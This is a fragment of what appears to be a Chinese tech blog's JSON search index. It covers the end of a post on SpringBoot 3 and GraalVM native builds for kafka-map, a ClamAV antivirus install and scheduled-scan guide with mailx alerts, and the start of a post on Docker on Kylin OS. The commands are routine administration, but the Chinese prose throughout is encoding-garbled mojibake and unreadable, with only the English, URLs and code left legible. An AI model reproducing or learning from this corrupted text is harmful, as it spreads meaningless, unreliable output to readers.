åˆ†é’Ÿçš„ç­‰å¾…ã€‚\nè¿è¡ŒæˆåŠŸï¼Ÿä¸ï¼Œæˆ‘åˆå¤±è´¥äº†ã€‚å½“ç„¶ï¼Œæˆ‘å¤±è´¥çš„å¾ˆå¿«ï¼Œ87æ¯«ç§’ã€‚\næŸ¥çœ‹åŸå› ï¼ŒåŸæ¥æ˜¯æ‰¾ä¸åˆ°æˆ‘çš„ sqlite æ–¹è¨€ç±»ï¼Œæ­¤æ—¶æˆ‘çªç„¶æƒ³åˆ° GraalVM Native Image Support å…¶ä¸­ä¸€æ®µè¯ã€‚\nUnlike traditional applications written for the JVM, GraalVM Native Image applications require ahead-of-time processing in order to create an executable. This ahead-of-time processing involves statically analyzing your application code from its main entry point.\nç¿»è¯‘ï¼šä¸ä¸ºJVMç¼–å†™çš„ä¼ ç»Ÿåº”ç”¨ç¨‹åºä¸åŒï¼ŒGraalVM Native Imageåº”ç”¨ç¨‹åºéœ€è¦æå‰å¤„ç†æ‰èƒ½åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿™ç§è¶…å‰å¤„ç†æ¶‰åŠä»åº”ç”¨ç¨‹åºçš„ä¸»è¦å…¥å£ç‚¹é™æ€åˆ†æåº”ç”¨ç¨‹åºä»£ç ã€‚\nGraalVM ä»ç¨‹åºå…¥å£åˆ†æåº”ç”¨ç¨‹åºä»£ç ï¼Œè€Œæˆ‘åœ¨ä»£ç ä»»ä½•ä¸€ä¸ªåœ°æ–¹éƒ½æ²¡æœ‰å¼•ç”¨è¿‡ org.hibernate.community.dialect.SQLiteDialect è¿™ä¸ªç±»ï¼Œç„¶åå®ƒå°±è¢« GraalVM æ— æƒ…çš„æŠ›å¼ƒäº†ã€‚\næ€»ç»“ ä½¿ç”¨ GraalVM æ‰“åŒ…Javaç¨‹åºä¸ºåŸç”ŸäºŒè¿›åˆ¶ç¡®å®ä¸ºJavaç¨‹åºæä¾›äº†æå¿«çš„å¯åŠ¨é€Ÿåº¦ï¼Œæ— éœ€jreè¿è¡Œç¯å¢ƒï¼Œå¾ˆæ–¹ä¾¿ï¼Œä½†ä¹‹å‰å¼€å‘çš„ç¨‹åºæƒ³è¦ä½¿ç”¨æ­¤ç‰¹æ€§ææ€•è¿˜æ˜¯æœ‰ç‚¹å›°éš¾ï¼Œæ–°å¼€å‘çš„é¡¹ç›®ä¹Ÿéœ€è¦æ‘’å¼ƒæ‰ä¹‹å‰çš„ä¸€äº›å¼€å‘ä¹ æƒ¯æ‰èƒ½ä½¿ç”¨ï¼Œå¹¶ä¸”äºŒè¿›åˆ¶æ–‡ä»¶å¤ªå¤§ã€GraalVM å°šæœªæ”¯æŒäº¤å‰ç¼–è¯‘ï¼Œå¯¹æ¯”Golangè¿˜æœ‰å¾ˆå¤§çš„å·®è·ã€‚\nå› ä¸ºæˆ‘è¿˜å°šæœªæˆåŠŸè¿è¡Œèµ·åŸç”ŸäºŒè¿›åˆ¶çš„ kafka-mapï¼Œä¸æ¸…æ¥š GraalVM å¯¹ä¸€äº›è¿è¡Œæ—¶çš„API æ”¯æŒå¦‚ä½•ï¼Œåç»­æˆ‘å°†ä¼šåŠªåŠ›è¿è¡Œèµ·æ¥ åŸç”ŸäºŒè¿›åˆ¶çš„ kafka-mapï¼Œå¹¶ä¸”å¯¹åŠŸèƒ½è¿›è¡Œè¯¦ç»†çš„æµ‹è¯•ã€‚\næœªå®Œå¾…ç»­\u0026hellip;\n","permalink":"https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/","summary":"\u003cp\u003e2022å¹´11æœˆ24æ—¥ SpringBoot æ­£å¼å‘å¸ƒäº† 3.0 ç‰ˆæœ¬ï¼Œå¸¦æ¥è®¸å¤šæ–°çš„ç‰¹æ€§ï¼Œä½†æˆ‘æœ€å…³å¿ƒçš„è¿˜æ˜¯Javaæ‰“åŒ…æˆåŸç”ŸäºŒè¿›åˆ¶ï¼Œè¿è¡Œæ—¶ä¸å†ä¾èµ–jreç¯å¢ƒï¼Œè¿è¡ŒJavaç¨‹åºå°†å’ŒGoç¨‹åºä¸€æ ·æ–¹ä¾¿ã€‚\u003c/p\u003e\n\u003ch2 id=\"å‡çº§è‡³-springboot-300\"\u003eå‡çº§è‡³ SpringBoot 3.0.0\u003c/h2\u003e\n\u003cp\u003eè¯´æ˜¯å°é²œï¼Œä½†æ˜¯æˆ‘ä¸æƒ³å†è¯•ç€æ hello world é‚£ç§å•¥éƒ½æ²¡æœ‰çš„ä¸œè¥¿äº†ï¼Œæ‰¾åˆ°æˆ‘ä¹‹å‰å†™çš„ä¸€ä¸ªJavaå¼€æºé¡¹ç›® \u003ca href=\"https://github.com/dushixiang/kafka-map\"\u003ekafka-map\u003c/a\u003e æ‹¿ä»–å¼€åˆ€ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/dushixiang/kafka-map\"\u003ekafka-map\u003c/a\u003e æœ¬èº«æ˜¯åŸºäº SpringBoot 2.4.x å¼€å‘çš„ï¼Œsqlite å­˜å‚¨æ•°æ®ï¼Œä¸”å¾ˆä¹…æ²¡æœ‰å¤§çš„æ›´æ–°äº†ï¼Œæƒ³è¦ç›´æ¥å‡çº§åˆ° SpringBoot 3.0.0 æ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ \u003ca href=\"https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-3.0-Migration-Guide\"\u003eSpring Boot 3.0 è¿ç§»æŒ‡å—\u003c/a\u003e é¦–å…ˆå‡çº§åˆ°æœ€æ–°2.7.xç‰ˆæœ¬ï¼Œç„¶åå°±å‘ç° service ä¾èµ–å¾ªç¯äº†ï¼Œè¿™ä¸ªæ—¶å€™æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­å…è®¸ä¾èµ–å¾ªç¯ \u003ccode\u003espring.main.allow-circular-references: true\u003c/code\u003eï¼ŒäºŒæ˜¯æ¢³ç†ä¸šåŠ¡é€»è¾‘è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ã€‚ä½œä¸ºä¸€ä¸ªåˆæ ¼çš„å¼€å‘ï¼Œæˆ‘é€‰æ‹©äº†è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ï¼Œè¿‡ç¨‹ä¸è¡¨ã€‚\u003c/p\u003e\n\u003cp\u003eSpringBoot 3.0.0 å‡çº§äº†å¾ˆå¤šç»„ä»¶ï¼Œå…¶ä¸­ Jpa ä¾èµ–çš„ Hibernate å‡çº§åˆ°äº† 6.xï¼Œæˆ‘å¯åŠ¨æ—¶åˆé‡åˆ°äº† sqlite æ–¹è¨€æ’ä»¶ä¸å¯ç”¨çš„é—®é¢˜ï¼Œè¿˜å¥½ Hibernate 6.x å·²ç»æ”¯æŒäº† sqliteæ–¹è¨€ï¼Œåˆ‡æ¢åˆ°å®˜æ–¹æ’ä»¶å°±å¥½äº†ã€‚é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003espring\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003edatasource\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eurl\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ejdbc:sqlite:data/kafka-map.db\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edriver-class-name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eorg.sqlite.JDBC\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ejpa\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ehibernate\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eddl-auto\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eupdate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eshow-sql\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eproperties\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ehibernate\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edialect\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eorg.hibernate.community.dialect.SQLiteDialect\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"åŸç”ŸäºŒè¿›åˆ¶æ‰“åŒ…\"\u003eåŸç”ŸäºŒè¿›åˆ¶æ‰“åŒ…\u003c/h2\u003e\n\u003cp\u003eæ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶è¿˜æ˜¯æœ€æŠ˜è…¾çš„ï¼Œåˆšå¼€å§‹å‚è€ƒ\u003ca href=\"https://docs.spring.io/spring-boot/docs/3.0.0/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks\"\u003eGraalVM Native Image Support\u003c/a\u003e æŠŠæ‰“åŒ… \u003ccode\u003espringboot:build-image\u003c/code\u003e å½“æˆäº†æ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶äº†ï¼Œè€Œä¸”æ‰“åŒ…çš„è¿‡ç¨‹ä¸­è¿˜é‡åˆ°äº† \u003ccode\u003eUnsupportedFeatureException: No instances of ch.qos.logback.classic.Logger\u003c/code\u003e è¿™ä¸ªé—®é¢˜ï¼Œæ‰¾äº†ä¸€åœˆä¹Ÿæ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image.png\" loading=\"lazy\" src=\"https://oss.typesafe.cn/k5.png\"\u003e\u003c/p\u003e","title":"SpringBoot 3.0.0å°é²œä¸Javaæ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶ã€ä¸€ã€‘"},{"content":"Clam AntiVirusï¼ˆClamAVï¼‰æ˜¯å…è´¹è€Œä¸”å¼€æ”¾æºä»£ç çš„æ€æ¯’è½¯ä»¶ï¼Œè½¯ä»¶ä¸ç—…æ¯’ç çš„æ›´æ–°çš†ç”±ç¤¾ç¾¤å…è´¹å‘å¸ƒã€‚Github åœ°å€ï¼šhttps://github.com/Cisco-Talos/clamav\nå®‰è£… ClamAV yum install -y clamav* é…ç½® ClamAV cat \u0026gt; /etc/freshclam.conf \u0026lt;\u0026lt;EOF # æ•°æ®åº“é…ç½®æ–‡ä»¶å¤¹ DatabaseDirectory /var/lib/clamav # æ›´æ–°æ—¥å¿—æ–‡ä»¶å¤¹ UpdateLogFile /var/log/freshclam.log # æ—¥å¿—å¤§å° LogFileMaxSize 2M # æ—¥å¿—è®°å½•æ—¶é—´ LogTime yes # æ‰€å±ç”¨æˆ· DatabaseOwner root # åŒæ­¥ç—…æ¯’åº“çš„åœ°å€ DatabaseMirror database.clamav.net EOF æ›´æ–°ç—…æ¯’åº“ å¤§æ¦‚éœ€è¦å‡ åˆ†é’Ÿæ—¶é—´\nfreshclam è¿›è¡Œç—…æ¯’æ‰«ææµ‹è¯• clamscan -ri \u0026lt;/path1/to/scan\u0026gt; \u0026lt;/path2/to/scan\u0026gt; å¸¸ç”¨é…ç½®è¯´æ˜\n--recursive[=yes/no(*)] -r é€’å½’æŸ¥æ‰¾ --infected -I åªæ‰“å°å—å½±å“çš„æ–‡ä»¶ä¿¡æ¯ --remove[=yes/no(*)] åˆ é™¤å—å½±å“çš„æ–‡ä»¶ã€‚(ä¸å»ºè®®ä½¿ç”¨,æ ¹æ®æ‰«æç»“æœè¿›è¡Œæ‰‹åŠ¨åˆ é™¤,é¿å…è¯¯åˆ ã€‚) é…ç½®é‚®ç®± å¦‚æœä¸éœ€è¦é‚®ä»¶é€šçŸ¥çš„å¯ä»¥å¿½ç•¥æ­¤æ­¥éª¤ã€‚\nå®‰è£…é‚®ä»¶æœåŠ¡ yum install -y mailx ä¿®æ”¹é…ç½® ä¿®æ”¹å¤§å†™å­—æ¯ä¸ºä½ çš„é‚®ç®±é…ç½®\ncat \u0026gt; /etc/mail.rc \u0026lt;\u0026lt;EOF set from=USERNAME@YOURDOMAIN.COM set smtp=smtps://smtp.exmail.qq.com:465 set smtp-auth=login set smtp-auth-user=USERNAME@YOURDOMAIN.COM set smtp-auth-password=YOURPASSWORD set ssl-verify=ignore set nss-config-dir=/etc/pki/nssdb/ EOF å‘é€é‚®ä»¶è¿›è¡Œæµ‹è¯• echo \u0026#34;Your message\u0026#34; | mail -v -s \u0026#34;Message Subject\u0026#34; email@address å¦‚æœå‡ºç° â€œError in certificate: Peer\u0026rsquo;s certificate issuer is not recognizedâ€ å±äºæ­£å¸¸ã€‚\nå®šæœŸæ‰«æ ä½¿ç”¨ crontab -e å¢åŠ ä¸¤ä¸ªå®šæ—¶ä»»åŠ¡\n# æ¯å¤©å‡Œæ™¨ 2 ç‚¹åŠè¿›è¡Œç—…æ¯’åº“æ›´æ–° 30 2 * * * /bin/freshclam # æ¯å¤©å‡Œæ™¨ 3 ç‚¹åŠè¿›è¡Œç—…æ¯’æ‰«æ 30 3 * * * /bin/clamscan -ri \u0026lt;/path1/to/scan\u0026gt; | mail -s \u0026#34;ç—…æ¯’æ–‡ä»¶æ‰«ææŠ¥å‘Š\u0026#34; \u0026#39;youremailaddress\u0026#39; å¦‚æœä¸éœ€è¦å‘é€é‚®ä»¶ä½¿ç”¨ä¸‹é¢çš„é…ç½®\n# æ¯å¤©å‡Œæ™¨ 2 ç‚¹åŠè¿›è¡Œç—…æ¯’åº“æ›´æ–° 30 2 * * * /bin/freshclam # æ¯å¤©å‡Œæ™¨ 3 ç‚¹åŠè¿›è¡Œç—…æ¯’æ‰«æ 30 3 * * * /bin/clamscan -ri \u0026lt;/path1/to/scan\u0026gt; ","permalink":"https://www.typesafe.cn/posts/clamav-install/","summary":"\u003cp\u003e\u003cstrong\u003eClam AntiVirus\u003c/strong\u003eï¼ˆ\u003cstrong\u003eClamAV\u003c/strong\u003eï¼‰æ˜¯å…è´¹è€Œä¸”å¼€æ”¾æºä»£ç çš„æ€æ¯’è½¯ä»¶ï¼Œè½¯ä»¶ä¸ç—…æ¯’ç çš„æ›´æ–°çš†ç”±ç¤¾ç¾¤å…è´¹å‘å¸ƒã€‚Github åœ°å€ï¼šhttps://github.com/Cisco-Talos/clamav\u003c/p\u003e\n\u003ch3 id=\"å®‰è£…-clamav\"\u003eå®‰è£… ClamAV\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install -y clamav*\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"é…ç½®-clamav\"\u003eé…ç½® ClamAV\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat \u0026gt; /etc/freshclam.conf \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# æ•°æ®åº“é…ç½®æ–‡ä»¶å¤¹\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eDatabaseDirectory /var/lib/clamav\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# æ›´æ–°æ—¥å¿—æ–‡ä»¶å¤¹\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eUpdateLogFile /var/log/freshclam.log\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# æ—¥å¿—å¤§å°\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eLogFileMaxSize 2M\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# æ—¥å¿—è®°å½•æ—¶é—´\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eLogTime yes\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# æ‰€å±ç”¨æˆ·\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eDatabaseOwner root\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# åŒæ­¥ç—…æ¯’åº“çš„åœ°å€\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eDatabaseMirror database.clamav.net\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"æ›´æ–°ç—…æ¯’åº“\"\u003eæ›´æ–°ç—…æ¯’åº“\u003c/h3\u003e\n\u003cp\u003eå¤§æ¦‚éœ€è¦å‡ åˆ†é’Ÿæ—¶é—´\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efreshclam\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"è¿›è¡Œç—…æ¯’æ‰«ææµ‹è¯•\"\u003eè¿›è¡Œç—…æ¯’æ‰«ææµ‹è¯•\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eclamscan -ri \u0026lt;/path1/to/scan\u0026gt; \u0026lt;/path2/to/scan\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¸¸ç”¨é…ç½®è¯´æ˜\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e--recursive[=yes/no(*)]     -r      é€’å½’æŸ¥æ‰¾\n--infected                  -I      åªæ‰“å°å—å½±å“çš„æ–‡ä»¶ä¿¡æ¯\n--remove[=yes/no(*)]                åˆ é™¤å—å½±å“çš„æ–‡ä»¶ã€‚(ä¸å»ºè®®ä½¿ç”¨,æ ¹æ®æ‰«æç»“æœè¿›è¡Œæ‰‹åŠ¨åˆ é™¤,é¿å…è¯¯åˆ ã€‚)\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"é…ç½®é‚®ç®±\"\u003eé…ç½®é‚®ç®±\u003c/h3\u003e\n\u003cp\u003eå¦‚æœä¸éœ€è¦é‚®ä»¶é€šçŸ¥çš„å¯ä»¥å¿½ç•¥æ­¤æ­¥éª¤ã€‚\u003c/p\u003e\n\u003ch4 id=\"å®‰è£…é‚®ä»¶æœåŠ¡\"\u003eå®‰è£…é‚®ä»¶æœåŠ¡\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install -y mailx\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ä¿®æ”¹é…ç½®\"\u003eä¿®æ”¹é…ç½®\u003c/h4\u003e\n\u003cp\u003eä¿®æ”¹å¤§å†™å­—æ¯ä¸ºä½ çš„é‚®ç®±é…ç½®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat \u0026gt; /etc/mail.rc \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eset from=USERNAME@YOURDOMAIN.COM\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eset smtp=smtps://smtp.exmail.qq.com:465\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eset smtp-auth=login\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eset smtp-auth-user=USERNAME@YOURDOMAIN.COM\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eset smtp-auth-password=YOURPASSWORD\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eset ssl-verify=ignore\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eset nss-config-dir=/etc/pki/nssdb/\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"å‘é€é‚®ä»¶è¿›è¡Œæµ‹è¯•\"\u003eå‘é€é‚®ä»¶è¿›è¡Œæµ‹è¯•\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Your message\u0026#34;\u003c/span\u003e | mail -v -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Message Subject\u0026#34;\u003c/span\u003e email@address\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœå‡ºç° â€œError in certificate: Peer\u0026rsquo;s certificate issuer is not recognizedâ€ å±äºæ­£å¸¸ã€‚\u003c/p\u003e","title":"Linux æ€æ¯’è½¯ä»¶ ClamAV å®‰è£…"},{"content":" é“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ V10 æ˜¯é’ˆå¯¹ä¼ä¸šçº§å…³é”®ä¸šåŠ¡ï¼Œé€‚åº”è™šæ‹ŸåŒ–ã€ äº‘è®¡ç®—ã€å¤§æ•°æ®ã€å·¥ä¸šäº’è”ç½‘æ—¶ä»£å¯¹ä¸»æœºç³»ç»Ÿå¯é æ€§ã€å®‰å…¨æ€§ã€æ€§èƒ½ã€æ‰©å±•æ€§å’Œ å®æ—¶æ€§çš„éœ€æ±‚ï¼Œä¾æ® CMMI 5 çº§æ ‡å‡†ç ”åˆ¶çš„æä¾›å†…ç”Ÿå®‰å…¨ã€äº‘åŸç”Ÿæ”¯æŒã€å›½äº§ å¹³å°æ·±å…¥ä¼˜åŒ–ã€é«˜æ€§èƒ½ã€æ˜“ç®¡ç†çš„æ–°ä¸€ä»£è‡ªä¸»æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼›åŒæºæ”¯æŒé£è…¾ã€ é¾™èŠ¯ã€ç”³å¨ã€å…†èŠ¯ã€æµ·å…‰ã€é²²é¹ç­‰è‡ªä¸»å¹³å°ï¼›å¯æ”¯æ’‘æ„å»ºå¤§å‹æ•°æ®ä¸­å¿ƒæœåŠ¡å™¨é«˜ å¯ç”¨é›†ç¾¤ã€è´Ÿè½½å‡è¡¡é›†ç¾¤ã€åˆ†å¸ƒå¼é›†ç¾¤æ–‡ä»¶ç³»ç»Ÿã€è™šæ‹ŸåŒ–åº”ç”¨å’Œå®¹å™¨äº‘å¹³å°ç­‰ï¼Œ å¯éƒ¨ç½²åœ¨ç‰©ç†æœåŠ¡å™¨å’Œè™šæ‹ŸåŒ–ç¯å¢ƒã€ç§æœ‰äº‘ã€å…¬æœ‰äº‘å’Œæ··åˆäº‘ç¯å¢ƒï¼›åº”ç”¨äºæ”¿åºœã€ å›½é˜²ã€é‡‘èã€æ•™è‚²ã€è´¢ç¨ã€å…¬å®‰ã€å®¡è®¡ã€äº¤é€šã€åŒ»ç–—ã€åˆ¶é€ ç­‰é¢†åŸŸã€‚\nå…¬å¸æœ‰ä¸ªé¡¹ç›®éœ€è¦å°†ç³»ç»Ÿéƒ¨ç½²åœ¨ kylinosä¸Šï¼Œåˆšå¼€å§‹è¿˜æœ‰ç‚¹å¤´ç–¼ï¼Œå®³æ€•å„ç§ç¨‹åºæ— æ³•å®‰è£…å’Œä½¿ç”¨ï¼Œç­‰å®‰è£…å¥½æœåŠ¡å™¨è¿›è¡Œä½¿ç”¨çš„æ—¶å€™å‘ç°è¿™ä¸å°±æ˜¯åŸºäºcentosçš„å˜›ï¼Œè™½ç„¶åŸºäºå“ªä¸ªç‰ˆæœ¬ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥æµ‹è¯•çš„ï¼Œäºæ˜¯æˆ‘ä¸€é¡¿æ“ä½œï¼Œæœ€åå‘ç°å®ƒæ˜¯åŸºäºCentos8çš„ï¼Œç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬æ˜¯ 4.19ï¼Œé—®é¢˜ä¸å¤§ï¼Œæ—¢ç„¶æ˜¯åŸºäºCentos8çš„ï¼Œé‚£Centos8ä¸Šèƒ½è·‘çš„ç¨‹åºï¼Œåœ¨è¿™è‚¯å®šä¹Ÿèƒ½è·‘ï¼Œç„¶åæˆ‘å°±å¼€å§‹äº†æ„‰å¿«ï¼ˆç—›è‹¦ï¼‰çš„å®‰è£…dockerä¹‹æ—…äº†ã€‚\né…ç½®é˜¿é‡Œäº‘Centos8é•œåƒæº ä¹‹æ‰€ä»¥è¦é…ç½® Centos8 